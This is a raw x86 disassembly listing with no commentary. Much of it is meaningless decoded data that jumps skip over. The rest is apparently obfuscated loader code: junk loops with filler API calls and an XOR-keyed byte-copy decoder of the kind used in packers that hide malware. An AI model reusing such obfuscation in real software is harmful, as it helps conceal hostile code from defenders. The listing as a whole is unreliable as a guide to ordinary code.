  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x11de0451]
  4028ec:	inc    esi
  4028ed:	xor    BYTE PTR [ebx+0x7e7e0853],al
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x402908
  4028f8:	xchg   esp,eax
  4028f9:	pop    esi
  4028fa:	fcomp  DWORD PTR ds:0x20a46336
  402900:	lods   eax,DWORD PTR ds:[esi]
  402901:	pop    esi
  402902:	add    ecx,0x9ee5f8af
  402908:	xchg   edi,eax
  402909:	mov    bl,0xf7
  40290b:	and    al,0xba
  40290d:	xchg   BYTE PTR [ebp+0x13b27bd8],bl
  402913:	push   edx
  402914:	push   edi
  402915:	aas    
  402916:	xor    al,0x64
  402918:	cld    
  402919:	push   0xbeefa8a6
  40291e:	push   esp
  40291f:	dec    ebp
  402920:	jl     0x40294a
  402922:	or     al,0xa8
  402924:	aas    
  402925:	pop    ss
  402926:	aam    0x2a
  402928:	call   0xc633e442
  40292d:	mov    edx,0xd7bee855
  402932:	test   eax,0x20acdcb3
  402937:	sub    eax,0x64b38cb6
  40293c:	pop    ebp
  40293d:	dec    edi
  40293e:	push   ebp
  40293f:	dec    esi
  402940:	fisubr WORD PTR [eax-0x1]
  402944:	push   0x6ff20cb5
  402949:	push   esi
  40294a:	popf   
  40294b:	out    dx,eax
  40294c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40294d:	jle    0x402946
  40294f:	lods   al,BYTE PTR ds:[esi]
  402950:	push   edi
  402951:	jecxz  0x4029cd
  402953:	xor    bl,dh
  402955:	aas    
  402956:	jno    0x4029aa
  402958:	dec    ecx
  402959:	mov    dl,0x26
  40295b:	and    eax,esi
  40295d:	inc    ecx
  40295e:	xor    cl,BYTE PTR [edx+0x49]
  402961:	test   eax,0xfa3ec779
  402966:	(bad)
  40296a:	jne    0x40297c
  40296c:	ret    0xbbc5
  40296f:	sub    BYTE PTR [edi+0x3d],dh
  402972:	dec    ecx
  402973:	sbb    ecx,DWORD PTR [ebx+0x72]
  402976:	xchg   DWORD PTR [edx+ecx*4-0x1a],edi
  40297a:	shl    DWORD PTR [edi],cl
  40297c:	out    dx,eax
  40297d:	pop    ecx
  40297e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40297f:	xor    ch,al
  402981:	jecxz  0x4029d2
  402983:	mov    eax,0x21a8d780
  402988:	popa   
  402989:	rcl    DWORD PTR ds:0x3af14e6,cl
  40298f:	xchg   esp,eax
  402990:	xor    ah,BYTE PTR ds:0x50e107e2
  402996:	test   eax,0xa749593d
  40299b:	xchg   BYTE PTR [ebx],dl
  40299d:	(bad)  
  40299e:	fild   WORD PTR [esi]
  4029a0:	xchg   ebp,eax
  4029a1:	jnp    0x40296b
  4029a3:	xchg   ebx,eax
  4029a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029a5:	aam    0xb0
  4029a7:	stc    
  4029a8:	jl     0x40294e
  4029aa:	push   es
  4029ab:	fdivr  st,st(3)
  4029ad:	fstp   TBYTE PTR [ecx]
  4029af:	pop    edi
  4029b0:	icebp  
  4029b1:	test   DWORD PTR [eax],esp
  4029b3:	adc    bl,bl
  4029b5:	ret    0x7572
  4029b8:	das    
  4029b9:	fsubr  DWORD PTR [edx]
  4029bb:	jle    0x402a00
  4029bd:	add    BYTE PTR [eax-0x1e],ah
  4029c0:	aaa    
  4029c1:	jae    0x4029ff
  4029c3:	push   edi
  4029c4:	jg     0x4029a4
  4029c6:	test   BYTE PTR [edi],0xa1
  4029c9:	pusha  
  4029ca:	pusha  
  4029cb:	xchg   esp,eax
  4029cc:	shl    BYTE PTR [edi+0x5b],cl
  4029cf:	rol    BYTE PTR [ecx+0x54],0x2b
  4029d3:	push   ebp
  4029d4:	sub    edx,ebp
  4029d6:	aas    
  4029d7:	and    BYTE PTR [edx-0x34],dh
  4029da:	nop
  4029db:	(bad)  
  4029dc:	in     al,dx
  4029dd:	scas   eax,DWORD PTR es:[edi]
  4029de:	adc    edi,edx
  4029e0:	mov    edx,0x9d3c1f32
  4029e5:	ss sub eax,eax
  4029e8:	jl     0x4029ac
  4029ea:	loop   0x402984
  4029ec:	xchg   ecx,eax
  4029ed:	fist   DWORD PTR [eax+0x273996fe]
  4029f3:	or     al,0xff
  4029f5:	xchg   ecx,eax
  4029f6:	ror    DWORD PTR [ebx+0x64],1
  4029f9:	xchg   ebx,eax
  4029fa:	ror    BYTE PTR [esp+edi*2-0x75d137e8],cl
  402a01:	scas   eax,DWORD PTR es:[edi]
  402a02:	jne    0x402a2d
  402a04:	sar    BYTE PTR [edx+0x79],cl
  402a07:	fwait
  402a08:	adc    al,0x6b
  402a0a:	jle    0x4029ea
  402a0c:	xchg   bl,ch
  402a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a0f:	mov    cs,edi
  402a11:	dec    ebx
  402a12:	out    0x87,eax
  402a14:	loopne 0x4029ae
  402a16:	xchg   esi,eax
  402a17:	push   ecx
  402a18:	and    DWORD PTR ds:0x434707,0x0
  402a22:	jmp    0x402a34
  402a27:	mov    edx,DWORD PTR ds:0x434707
  402a2d:	inc    edx
  402a2e:	mov    DWORD PTR ds:0x434707,edx
  402a34:	cmp    DWORD PTR ds:0x434707,0x17
  402a3b:	jae    0x402a84
  402a41:	cmp    DWORD PTR ds:0x434707,0x4
  402a48:	jne    0x402a59
  402a4e:	push   0x434663
  402a53:	call   DWORD PTR ds:0x413330
  402a59:	cmp    DWORD PTR ds:0x434707,0x3
  402a60:	jne    0x402a75
  402a66:	xor    edx,edx
  402a68:	or     edx,DWORD PTR ds:0x434707
  402a6e:	inc    edx
  402a6f:	mov    DWORD PTR ds:0x434707,edx
  402a75:	jmp    0x402a27
  402a7a:	xor    DWORD PTR ds:0x43467f,0x2c9d
  402a84:	push   ecx
  402a85:	sbb    ecx,ecx
  402a87:	mov    eax,0xf89c8536
  402a8c:	sbb    DWORD PTR ds:0x4346bb,edi
  402a92:	mov    DWORD PTR [ebp-0x8],eax
  402a95:	and    DWORD PTR ds:0x4346f7,0x0
  402a9f:	mov    ecx,DWORD PTR ds:0x4346f7
  402aa5:	inc    ecx
  402aa6:	mov    DWORD PTR ds:0x4346f7,ecx
  402aac:	cmp    DWORD PTR ds:0x4346f7,0x25
  402ab3:	jne    0x402ac4
  402ab9:	push   0x8c9d
  402abe:	call   DWORD PTR ds:0x4133f4
  402ac4:	cmp    DWORD PTR ds:0x4346f7,0x19
  402acb:	jb     0x402a9f
  402ad1:	add    ecx,DWORD PTR ds:0x43478f
  402ad7:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  402ade:	mov    edx,DWORD PTR [ebp-0x8]
  402ae1:	push   esi
  402ae2:	mov    ecx,DWORD PTR ds:0x43477b
  402ae8:	or     DWORD PTR ds:0x434747,ecx
  402aee:	mov    ecx,0x7510851
  402af3:	xor    edx,ecx
  402af5:	mov    esi,0x327299
  402afa:	push   edi
  402afb:	add    DWORD PTR ds:0x434737,ebx
  402b01:	mov    edi,DWORD PTR [ebp+0x10]
  402b04:	sbb    DWORD PTR ds:0x434743,0x434683
  402b0e:	jmp    0x402c4b
  402b13:	pop    ss
  402b14:	imul   ecx,DWORD PTR ds:0x7d726d66,0xc1f40369
  402b1e:	(bad)  
  402b1f:	push   ds
  402b20:	shl    eax,0x7a
  402b23:	jae    0x402b2e
  402b25:	jle    0x402ba5
  402b27:	push   ds
  402b28:	jg     0x402ba8
  402b2a:	jle    0x402b6c
  402b2c:	jb     0x402ba8
  402b2e:	jnp    0x402b73
  402b30:	jp     0x402b86
  402b32:	and    BYTE PTR [edi-0x6d36b012],0xee
  402b39:	mov    esi,0xbc3ea1dd
  402b3e:	repz pop ecx
  402b40:	dec    esi
  402b41:	icebp  
  402b42:	out    dx,eax
  402b43:	sahf   
  402b44:	rcr    DWORD PTR [edi],0x26
  402b47:	(bad)  [ebp+0x4999f5d4]
  402b4d:	add    edx,DWORD PTR [ecx]
  402b4f:	inc    edx
  402b50:	jg     0x402b87
  402b52:	jmp    0x2c663a23
  402b57:	lahf   
  402b58:	mov    ebp,0xfa4f2001
  402b5d:	jmp    0x402af8
  402b5f:	pop    edi
  402b60:	or     DWORD PTR [ebp+esi*2+0x4507c35b],ecx
  402b67:	and    DWORD PTR [ebx],0x9950ba5c
  402b6d:	jb     0x402bce
  402b6f:	jmp    0x402b8c
  402b71:	addr16 call 0xfd7dccc8
  402b77:	les    eax,FWORD PTR [edx-0x37]
  402b7a:	mov    edi,0xd20aeb7c
  402b7f:	mov    al,ds:0x6982cb21
  402b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b85:	mov    esp,0x2c6625b5
  402b8a:	sbb    al,0x92
  402b8c:	ret    0x1ca0
  402b8f:	fiadd  DWORD PTR [esi]
  402b91:	(bad)  
  402b92:	cwde   
  402b93:	xlat   BYTE PTR ds:[ebx]
  402b94:	mov    al,ds:0x6746f39b
  402b99:	mov    ecx,0x364387ee
  402b9e:	push   esi
  402b9f:	fiadd  WORD PTR [edx-0x60582ad9]
  402ba5:	xchg   ah,ah
  402ba7:	shl    DWORD PTR ds:0x20086729,1
  402bad:	ret    0xee36
  402bb0:	xlat   BYTE PTR ds:[ebx]
  402bb1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bb3:	xor    al,0xb5
  402bb5:	cld    
  402bb6:	push   eax
  402bb7:	jg     0x402b83
  402bb9:	jno    0x402bad
  402bbb:	call   0xd38179b5
  402bc0:	sar    BYTE PTR [ecx],cl
  402bc2:	adc    DWORD PTR [ebx+0x18438952],0x43d2ab69
  402bcc:	adc    eax,0x65cb44be
  402bd1:	leave  
  402bd2:	xchg   esi,eax
  402bd3:	sbb    eax,0xe1199117
  402bd8:	or     BYTE PTR [esi-0x7c0ba578],al
  402bde:	jp     0x402be3
  402be0:	(bad)
  402be3:	pop    ebx
  402be4:	xor    BYTE PTR [edi-0x499a967],bl
  402bea:	lods   eax,DWORD PTR ds:[esi]
  402beb:	pop    ecx
  402bec:	aad    0x13
  402bee:	out    0x77,al
  402bf0:	arpl   WORD PTR [eax+0x6a],bp
  402bf3:	adc    al,0xa9
  402bf5:	or     ah,dl
  402bf7:	leave  
  402bf8:	lods   eax,DWORD PTR ds:[esi]
  402bf9:	adc    BYTE PTR [edx+0x11],ah
  402bfc:	mov    WORD PTR [esi-0x1f728523],ds
  402c02:	mov    ah,0xe9
  402c04:	jmp    0x521cabcd
  402c09:	loop   0x402bb7
  402c0b:	add    al,0xb5
  402c0d:	adc    eax,0xd157c683
  402c12:	popa   
  402c13:	aaa    
  402c14:	fild   WORD PTR [eax]
  402c16:	jecxz  0x402c6b
  402c18:	push   ebx
  402c19:	ja     0x402c85
  402c1b:	lds    edi,FWORD PTR [edx]
  402c1d:	xchg   esi,eax
  402c1e:	aas    
  402c1f:	inc    edx
  402c20:	mul    BYTE PTR [ecx+0x56]
  402c23:	sbb    edi,DWORD PTR [eax-0x1c]
  402c26:	xor    dl,BYTE PTR [edx+0x69]
  402c29:	mov    bl,0xc5
  402c2b:	dec    ebp
  402c2c:	leave  
  402c2d:	cmp    ah,BYTE PTR [ebx-0x5b]
  402c30:	(bad)  
  402c31:	mov    esi,0x2cac1764
  402c36:	lahf   
  402c37:	mov    ebp,0x13fdf3ae
  402c3c:	push   eax
  402c3d:	in     eax,dx
  402c3e:	jp     0x402c63
  402c40:	in     al,0x52
  402c42:	fist   WORD PTR [edx+ebp*8]
  402c45:	and    DWORD PTR [ebx+0x5484ec51],eax
  402c4b:	add    edx,esi
  402c4d:	cmp    edi,edx
  402c4f:	je     0x402e4c
  402c55:	and    DWORD PTR ds:0x434687,0x0
  402c5f:	mov    eax,ds:0x434687
  402c64:	inc    eax
  402c65:	mov    ds:0x434687,eax
  402c6a:	cmp    DWORD PTR ds:0x434687,0x17
  402c71:	jne    0x402c80
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	call   DWORD PTR ds:0x4133f8
  402c80:	cmp    DWORD PTR ds:0x434687,0x16
  402c87:	jb     0x402c5f
  402c8d:	xor    eax,0x6036
  402c92:	mov    edx,DWORD PTR [ebp-0x8]
  402c95:	mov    eax,DWORD PTR [ebp-0x4]
  402c98:	xor    eax,ecx
  402c9a:	mov    edi,0xffcd8d67
  402c9f:	xor    DWORD PTR ds:0x434667,0x434793
  402ca9:	sub    edi,eax
  402cab:	add    edi,DWORD PTR [ebp+0x10]
  402cae:	xor    edx,ecx
  402cb0:	add    edx,esi
  402cb2:	cmp    edx,edi
  402cb4:	ja     0x402e47
  402cba:	push   ebx
  402cbb:	jmp    0x402cc5
  402cc0:	mov    esi,0x327299
  402cc5:	mov    eax,DWORD PTR [ebp-0x8]
  402cc8:	mov    edi,DWORD PTR [ebp-0x4]
  402ccb:	xor    edi,ecx
  402ccd:	add    edi,esi
  402ccf:	mov    esi,DWORD PTR [ebp+0x8]
  402cd2:	imul   edi,edx
  402cd5:	jmp    0x402e12
  402cda:	push   ebp
  402cdb:	nop
  402cdc:	outs   dx,BYTE PTR ds:[esi]
  402cdd:	stos   DWORD PTR es:[edi],eax
  402cde:	jae    0x402d5d
  402ce0:	push   ebp
  402ce1:	jo     0x402cac
  402ce3:	sub    esi,esp
  402ce5:	lods   eax,DWORD PTR ds:[esi]
  402ce6:	neg    DWORD PTR [ecx+0xb135651]
  402cec:	jle    0x402d6c
  402cee:	push   ds
  402cef:	jg     0x402d6f
  402cf1:	jle    0x402c99
  402cf3:	jmp    0xf8fb:0xd107a0d0
  402cfa:	mov    dl,0xfe
  402cfc:	test   eax,ebx
  402cfe:	jle    0x402d68
  402d00:	fcmovnu st,st(2)
  402d02:	add    BYTE PTR [ebx-0x5dcee41e],al
  402d08:	mov    ecx,DWORD PTR [esi+0x3015e18e]
  402d0e:	inc    esp
  402d0f:	in     eax,0x77
  402d11:	cwde   
  402d12:	mov    cl,BYTE PTR [eax]
  402d14:	sub    ecx,0x71
  402d17:	xchg   edi,eax
  402d18:	mov    eax,0x5f39ab3d
  402d1d:	dec    ecx
  402d1e:	scas   al,BYTE PTR es:[edi]
  402d1f:	jo     0x402d69
  402d21:	add    eax,0x18060425
  402d26:	out    dx,al
  402d27:	sub    ebp,DWORD PTR [edi+ebx*4+0x26b9d4ce]
  402d2e:	daa    
  402d2f:	jne    0x402da7
  402d31:	mov    al,ds:0x6d847a14
  402d36:	xor    eax,0x9ec9ffa6
  402d3b:	push   ds
  402d3c:	int3   
  402d3d:	xor    edi,DWORD PTR [ebx-0x304b2680]
  402d43:	jecxz  0x402daf
  402d45:	and    ebp,DWORD PTR [esi]
  402d47:	add    ah,dh
  402d49:	js     0x402d15
  402d4b:	inc    ecx
  402d4c:	add    eax,0xb1946e37
  402d51:	(bad)  
  402d52:	pop    esp
  402d53:	xchg   ebp,eax
  402d54:	fnsave [edx-0xa]
  402d57:	jmp    0x402d80
  402d59:	pop    ss
  402d5a:	popa   
  402d5b:	xor    eax,0xf6456a92
  402d60:	icebp  
  402d61:	mov    edi,0xafb0f9d4
  402d66:	mov    ah,0x7d
  402d68:	(bad)  
  402d69:	push   ds
  402d6a:	xor    DWORD PTR [eax],0x51
  402d6d:	js     0x402d2b
  402d6f:	out    dx,al
  402d70:	push   ecx
  402d71:	ss ins BYTE PTR es:[edi],dx
  402d73:	or     al,0xa8
  402d75:	and    ebx,esp
  402d77:	mov    bh,0xb5
  402d79:	push   ss
  402d7a:	and    eax,0x9cb4ea69
  402d7f:	arpl   WORD PTR [edi+0x58],bx
  402d82:	inc    edi
  402d83:	add    dh,BYTE PTR [edx+0x1e]
  402d86:	stc    
  402d87:	je     0x402d34
  402d89:	sbb    ah,bh
  402d8b:	xor    al,0x4e
  402d8d:	jg     0x402d7e
  402d8f:	and    eax,DWORD PTR [ecx+0x52a3bbac]
  402d95:	xor    BYTE PTR [ebx+ebx*2],dh
  402d98:	jno    0x402d4a
  402d9a:	mov    es,WORD PTR [ebp+0x43edc212]
  402da0:	add    al,BYTE PTR [edi]
  402da2:	dec    ecx
  402da3:	fild   DWORD PTR [ecx+0x49]
  402da6:	sub    DWORD PTR [edx+0x3b],eax
  402da9:	inc    edi
  402daa:	push   0x9d4d31b
  402daf:	mov    edi,0xa2761128
  402db4:	pop    eax
  402db5:	and    al,0x8d
  402db7:	call   0xa6df74c3
  402dbc:	in     eax,0xa4
  402dbe:	inc    esp
  402dbf:	fistp  DWORD PTR [ecx+0x6ff47990]
  402dc5:	jmp    0x2c84:0xf53f2867
  402dcc:	int    0xae
  402dce:	dec    esp
  402dcf:	stos   BYTE PTR es:[edi],al
  402dd0:	sub    DWORD PTR [ebp+0x33],eax
  402dd3:	sbb    al,0x7e
  402dd5:	out    dx,al
  402dd6:	fild   WORD PTR [ebp+0xe]
  402dd9:	add    al,0x42
  402ddb:	inc    esi
  402ddc:	xchg   esp,eax
  402ddd:	and    DWORD PTR [esi+0xc],esi
  402de0:	adc    DWORD PTR [ecx+0x43fbe124],ebp
  402de6:	inc    eax
  402de7:	push   ecx
  402de8:	and    dh,BYTE PTR [esi+0x41d1cb65]
  402dee:	jno    0x402dda
  402df0:	(bad)  
  402df1:	imul   edx,edx,0x7c
  402df4:	inc    ebx
  402df5:	int    0x21
  402df7:	push   edi
  402df8:	in     al,dx
  402df9:	or     BYTE PTR [edx-0x3deb78],0xd
  402e00:	fwait
  402e01:	mov    BYTE PTR [edx],cl
  402e03:	jg     0x402e37
  402e05:	dec    edx
  402e06:	pop    DWORD PTR [eax+edi*1-0x6cb5b25e]
  402e0d:	test   ch,ch
  402e0f:	fnsave [eax+0x2b]
  402e12:	mov    ebx,DWORD PTR [ebp+0xc]
  402e15:	xor    eax,ecx
  402e17:	add    eax,edx
  402e19:	mov    al,BYTE PTR [ebx+eax*1+0x327299]
  402e20:	mov    BYTE PTR [edi+esi*1],al
  402e23:	mov    eax,DWORD PTR [ebp-0x4]
  402e26:	xor    eax,ecx
  402e28:	lea    edx,[edx+eax*1+0x327299]
  402e2f:	mov    eax,DWORD PTR [ebp-0x4]
  402e32:	xor    eax,ecx
  402e34:	mov    esi,0xffcd8d67
  402e39:	sub    esi,eax
  402e3b:	add    esi,DWORD PTR [ebp+0x10]
  402e3e:	cmp    edx,esi
  402e40:	jbe    0x402cc0
  402e46:	pop    ebx
  402e47:	mov    eax,0xf89c8539
  402e4c:	pop    edi
  402e4d:	pop    esi
  402e4e:	leave  
  402e4f:	ret    0xc
  402e52:	push   ebp
  402e53:	mov    ebp,esp
  402e55:	mov    eax,DWORD PTR [ebp+0xc]
  402e58:	xor    edx,edx
  402e5a:	mov    ecx,0x7264fcae
  402e5f:	div    ecx
  402e61:	mov    ecx,DWORD PTR [ebp+0x10]
  402e64:	and    ecx,eax
  402e66:	or     ecx,0x81161d8c
  402e6c:	mov    eax,ecx
  402e6e:	pop    ebp
  402e6f:	ret    0x18
  402e72:	push   ebp
  402e73:	mov    ebp,esp
  402e75:	sub    esp,0x58
  402e78:	and    DWORD PTR ds:0x4346f7,edi
  402e7e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e81:	jmp    0x403276
  402e86:	inc    ebx
  402e87:	dec    di
  402e89:	fwait
  402e8a:	imul   esi,DWORD PTR [ebx-0x4190998d],0xffffffd0
  402e91:	add    ch,BYTE PTR [edi+edx*8+0x1433ca11]
  402e98:	jle    0x402f18
  402e9a:	push   esi
  402e9b:	jns    0x402f1b
  402e9d:	jle    0x402ec5
  402e9f:	xor    ch,BYTE PTR [eax+0xd]
  402ea2:	add    DWORD PTR [esi+0x1b],esp
  402ea5:	ret    
  402ea6:	jecxz  0x402ef2
  402ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ea9:	xchg   eax,ecx
  402eab:	mov    ch,0x35
  402ead:	push   ds
  402eae:	mov    ah,0x49
  402eb0:	xor    ch,dl
  402eb2:	jne    0x402ec1
  402eb4:	fs inc esi
  402eb6:	pop    es
  402eb7:	(bad)  
  402eb8:	rcl    cl,1
  402eba:	ins    DWORD PTR es:[edi],dx
  402ebb:	or     eax,0x723e5d2a
  402ec0:	adc    bh,BYTE PTR [ebx-0x1d]
  402ec3:	pop    eax
  402ec4:	mov    DWORD PTR [ecx+eiz*4+0x51],ebx
  402ec8:	mov    bh,0x96
  402eca:	push   0x99ba43c3
  402ecf:	and    BYTE PTR [ebx+0x734ab3af],bh
  402ed5:	sbb    eax,0x79135366
  402eda:	jle    0x402f3d
  402edc:	mov    edx,0xb71e8fa0
  402ee1:	sar    DWORD PTR [edi-0x72],1
  402ee4:	jecxz  0x402ee3
  402ee6:	int3   
  402ee7:	mov    dl,0x8f
  402ee9:	mov    ch,0xdf
  402eeb:	sti    
  402eec:	push   esi
  402eed:	mov    dl,0x13
  402eef:	xor    BYTE PTR [ecx-0x1d14ddb5],cl
  402ef5:	push   ecx
  402ef6:	adc    dh,BYTE PTR cs:[ebx]
  402ef9:	fwait
  402efa:	out    dx,al
  402efb:	cmp    dl,BYTE PTR [ecx]
  402efd:	shl    DWORD PTR [ebx+eiz*8+0x25749933],cl
  402f04:	sahf   
  402f05:	mov    ch,0x79
  402f07:	out    0x77,al
  402f09:	mov    ?,WORD PTR [eax+0x30]
  402f0c:	retf   0x710e
  402f0f:	(bad)  
  402f10:	stc    
  402f11:	cli    
  402f12:	sub    DWORD PTR [eax],eax
  402f14:	ja     0x402f58
  402f16:	push   esi
  402f17:	xchg   DWORD PTR [ecx],eax
  402f19:	inc    ebp
  402f1a:	retf   
  402f1b:	shr    DWORD PTR [edi-0x7f],1
  402f1e:	outs   dx,DWORD PTR ds:[esi]
  402f1f:	mov    WORD PTR [eax+0x209e80cb],gs
  402f25:	inc    edi
  402f26:	mov    ecx,0x474b214
  402f2b:	xchg   edx,eax
  402f2c:	inc    ebx
  402f2d:	out    dx,al
  402f2e:	rcl    DWORD PTR ds:0x416eb6db,cl
  402f34:	fs test eax,0xae4d3140
  402f3a:	pop    edi
  402f3b:	mov    edi,0xa9081ff0
  402f40:	mov    bh,0xf7
  402f42:	jmp    edx
  402f44:	inc    ecx
  402f45:	ins    BYTE PTR es:[edi],dx
  402f46:	push   eax
  402f47:	mov    edi,0xf435ff30
  402f4c:	mov    ebp,0xf42a2460
  402f51:	out    dx,eax
  402f52:	fs std 
  402f54:	hlt    
  402f55:	and    edx,eax
  402f57:	ss push esp
  402f59:	in     al,0xb1
  402f5b:	fsubr  st,st(4)
  402f5d:	xchg   edx,eax
  402f5e:	xor    al,0xa3
  402f60:	push   ebx
  402f61:	push   ds
  402f62:	fs repz retf 
  402f65:	jp     0x402f9b
  402f67:	sub    al,0x4f
  402f69:	sbb    BYTE PTR [ebx],ah
  402f6b:	and    eax,0x97c2ba22
  402f70:	arpl   bx,si
  402f72:	sbb    eax,0x7af03c61
  402f77:	cwde   
  402f78:	jbe    0x402fe7
  402f7a:	stos   BYTE PTR es:[di],al
  402f7c:	imul   ecx,DWORD PTR [esi],0x3feb164b
  402f82:	hlt    
  402f83:	aaa    
  402f84:	xchg   esi,eax
  402f85:	mov    WORD PTR [esi],fs
  402f87:	test   eax,0x68038641
  402f8c:	sbb    esp,DWORD PTR [ebx+0x1c]
  402f8f:	sub    eax,0x194a79
  402f94:	jecxz  0x402f26
  402f96:	mov    bl,0xbb
  402f98:	pop    ebx
  402f99:	sbb    eax,0x7c916cd4
  402f9e:	inc    eax
  402f9f:	push   ebx
  402fa0:	dec    ebp
  402fa1:	cmp    edx,esp
  402fa3:	cwde   
  402fa4:	mov    esi,edx
  402fa6:	or     eax,0xb6bd4b87
  402fab:	(bad)  
  402fac:	jg     0x40301e
  402fae:	add    BYTE PTR [edx+0x34],al
  402fb1:	cld    
  402fb2:	ror    edi,cl
  402fb4:	ficom  DWORD PTR [eax]
  402fb6:	sar    DWORD PTR [eax+0x478db4fe],0x83
  402fbd:	jne    0x402fe5
  402fbf:	xchg   ecx,eax
  402fc0:	cli    
  402fc1:	jmp    0x402f94
  402fc3:	bound  esp,QWORD PTR [edx]
  402fc5:	or     eax,0x7cd0fcc5
  402fca:	int3   
  402fcb:	push   0xe35f2ed0
  402fd0:	(bad)  
  402fd1:	push   es
  402fd2:	hlt    
  402fd3:	sub    eax,0xc23d8429
  402fd8:	push   ebp
  402fd9:	push   esi
  402fda:	mov    ds,WORD PTR [ecx+eiz*8-0x34c4fcc2]
  402fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe2:	addr16 loope 0x40301f
  402fe5:	xchg   esp,eax
  402fe6:	call   0x8802:0x804ed592
  402fed:	jmp    0x402fc8
  402fef:	inc    ebx
  402ff0:	and    BYTE PTR [ebp-0x32],bl
  402ff3:	retf   
  402ff4:	add    al,0xe1
  402ff6:	sub    al,0x9
  402ff8:	loopne 0x40301c
  402ffa:	test   DWORD PTR [ebx-0x4a],edi
  402ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ffe:	jle    0x403070
  403000:	retf   
  403001:	mov    es,WORD PTR [edi]
  403003:	xor    eax,0xf69a77aa
  403008:	sub    eax,edx
  40300a:	sbb    al,0x85
  40300c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40300d:	dec    edi
  40300e:	mov    ch,0x81
  403010:	pop    esp
  403011:	rcr    bh,cl
  403013:	inc    edi
  403014:	out    dx,al
  403015:	sbb    esi,DWORD PTR [ebp-0x42d00aa4]
  40301b:	js     0x40304a
  40301d:	sbb    eax,0x9102537a
  403022:	call   0x4cd9:0xbfa23b7a
  403029:	push   ds
  40302a:	rcl    DWORD PTR [ecx-0x7],1
  40302d:	and    ah,BYTE PTR [ebp+0x42204eaa]
  403033:	xchg   bh,bl
  403035:	daa    
  403036:	push   edx
  403037:	cmp    BYTE PTR [eax+edx*8-0x33],bl
  40303b:	mov    ecx,0x516bbeb5
  403040:	jle    0x40304e
  403042:	add    DWORD PTR [edi-0x2f],ecx
  403045:	fmul   st(5),st
  403047:	stos   DWORD PTR es:[edi],eax
  403048:	fldcw  WORD PTR [edi+0x4b602cd5]
  40304e:	or     edi,edx
  403050:	pop    ss
  403051:	pop    es
  403052:	leave  
  403053:	sbb    BYTE PTR [edx+0x7741b360],bl
  403059:	cmc    
  40305a:	adc    eax,DWORD PTR [esp+edx*1-0x7794d73a]
  403061:	cmp    dh,BYTE PTR [eax]
  403063:	(bad)  
  403064:	cmp    al,0xa5
  403066:	mov    DWORD PTR [edi-0x12],ebx
  403069:	jo     0x403099
  40306b:	es mov dh,dh
  40306e:	in     al,0x17
  403070:	xchg   ecx,eax
  403071:	cmp    al,0xe8
  403073:	push   edx
  403074:	xchg   edi,eax
  403075:	in     eax,dx
  403076:	jl     0x403096
  403078:	shl    BYTE PTR [ecx],1
  40307a:	or     BYTE PTR [esi],0x8e
  40307d:	into   
  40307e:	push   es
  40307f:	add    ah,bh
  403081:	mov    bl,dl
  403083:	xchg   DWORD PTR [edx],esp
  403085:	adc    cl,BYTE PTR [esi]
  403087:	loope  0x4030f2
  403089:	scas   al,BYTE PTR es:[edi]
  40308a:	add    DWORD PTR [ecx+0x7d],0xffffffab
  40308e:	ret    
  40308f:	and    esp,DWORD PTR [edi+0x28e9a3ad]
  403095:	add    eax,0x4ef4c4cf
  40309a:	pop    ss
  40309b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40309c:	scas   al,BYTE PTR es:[edi]
  40309d:	int3   
  40309e:	icebp  
  40309f:	loop   0x4030a0
  4030a1:	jl     0x4030c8
  4030a3:	sub    bh,0x7c
  4030a6:	pop    edi
  4030a7:	dec    ecx
  4030a8:	fs dec ebx
  4030aa:	pop    edx
  4030ab:	retf   0x16a3
  4030ae:	cmp    ch,BYTE PTR [ebp+0x4235a4a5]
  4030b4:	or     al,0xf2
  4030b6:	push   0x6c
  4030b8:	inc    esp
  4030b9:	nop
  4030ba:	sbb    al,0x1e
  4030bc:	in     al,dx
  4030bd:	push   ss
  4030be:	aaa    
  4030bf:	and    eax,0xc9ad2616
  4030c4:	shl    DWORD PTR [ebp+0x6e],1
  4030c7:	leave  
  4030c8:	mov    ds:0x415c20ed,al
  4030cd:	pop    edi
  4030ce:	jge    0x4030bc
  4030d0:	add    ecx,ecx
  4030d2:	(bad)  
  4030d3:	or     eax,0x4742e027
  4030d8:	daa    
  4030d9:	or     eax,0x6af1fb50
  4030de:	cmc    
  4030df:	push   cs
  4030e0:	mov    edx,0x2160645a
  4030e5:	jbe    0x403114
  4030e7:	mov    dh,0x27
  4030e9:	mov    ebp,0x5b37011a
  4030ee:	lods   eax,DWORD PTR ds:[esi]
  4030ef:	lods   al,BYTE PTR ds:[esi]
  4030f0:	inc    esi
  4030f1:	ja     0x403131
  4030f3:	daa    
  4030f4:	jp     0x40308f
  4030f6:	or     BYTE PTR [ebp+0x36],bl
  4030f9:	sub    al,0xc1
  4030fb:	mov    cl,0x33
  4030fd:	pop    edi
  4030fe:	aad    0xe4
  403100:	loope  0x40315d
  403102:	cmp    dl,BYTE PTR [ecx-0x1f28c67b]
  403108:	outs   dx,BYTE PTR ds:[esi]
  403109:	push   edx
  40310a:	popa   
  40310b:	sbb    DWORD PTR [esi+0x1c],edi
  40310e:	push   ecx
  40310f:	je     0x4030e3
  403111:	arpl   WORD PTR ds:0xfed6a06d,si
  403117:	pop    ebp
